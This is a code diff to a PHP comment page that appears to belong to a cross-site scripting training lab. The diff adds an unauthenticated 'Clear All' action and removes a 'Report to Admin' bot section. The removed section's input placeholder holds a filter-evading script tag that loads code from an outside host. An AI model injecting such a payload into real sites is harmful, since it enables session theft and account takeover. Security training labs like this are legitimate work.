@@ -3,22 +3,35 @@ include '../headers.php';
 $file = '../data/comments.json';
 
 // Handle POST
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['comment'])) {
-    $comment = $_POST['comment'];
-    $data = [];
-    if (file_exists($file)) {
-        $json = file_get_contents($file);
-        $data = json_decode($json, true);
-        if (!is_array($data)) $data = [];
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Clear Comments
+    if (isset($_POST['clear'])) {
+        if (file_exists($file)) {
+            file_put_contents($file, json_encode([]));
+        }
+        // Redirect to prevent resubmission
+        header("Location: index.php");
+        exit;
     }
-    
-    // Add new comment
-    $data[] = [
-        'time' => date('Y-m-d H:i:s'),
-        'text' => $comment
-    ];
-    
-    file_put_contents($file, json_encode($data));
+
+    // Add Comment
+    if (isset($_POST['comment'])) {
+        $comment = $_POST['comment'];
+        $data = [];
+        if (file_exists($file)) {
+            $json = file_get_contents($file);
+            $data = json_decode($json, true);
+            if (!is_array($data)) $data = [];
+        }
+        
+        // Add new comment
+        $data[] = [
+            'time' => date('Y-m-d H:i:s'),
+            'text' => $comment
+        ];
+        
+        file_put_contents($file, json_encode($data));
+    }
 }
 
 // Read comments
@@ -51,7 +64,12 @@ if (file_exists($file)) {
         </form>
         
         <div class="comments-section">
-            <h3>Comments</h3>
+            <div style="display: flex; justify-content: space-between; align-items: center;">
+                <h3>Comments</h3>
+                <form method="POST" action="" style="margin: 0;">
+                    <button type="submit" name="clear" value="1" style="background: #ff3333; font-size: 0.8em; padding: 5px 10px;">Clear All</button>
+                </form>
+            </div>
             <?php foreach (array_reverse($comments) as $c): ?>
                 <div class="comment">
                     <small><?php echo htmlspecialchars($c['time']); ?></small><br>
@@ -61,18 +79,6 @@ if (file_exists($file)) {
             <?php endforeach; ?>
         </div>
         
-        <div style="margin-top: 40px; border-top: 1px dashed var(--neon-cyan); padding-top: 20px;">
-            <h3>Report to Admin</h3>
-            <p>Found a vulnerability? Enter your payload below to notify the admin.</p>
-            <div>
-                <input type="text" id="payload-input" placeholder="<sCRiPt sRC=//xs.pe/6HW></sCrIpT>" value="">
-                <button onclick="AdminBot.send('level3', 'payload-input')">Send to Admin Bot</button>
-            </div>
-            <div style="margin-top: 10px; font-size: 12px; font-family: 'Share Tech Mono';">
-                STATUS: <span id="bot-status" style="color: #666;">IDLE</span>
-            </div>
-        </div>
     </div>
-    <script src="../assets/admin-bot.js"></script>
 </body>
 </html>
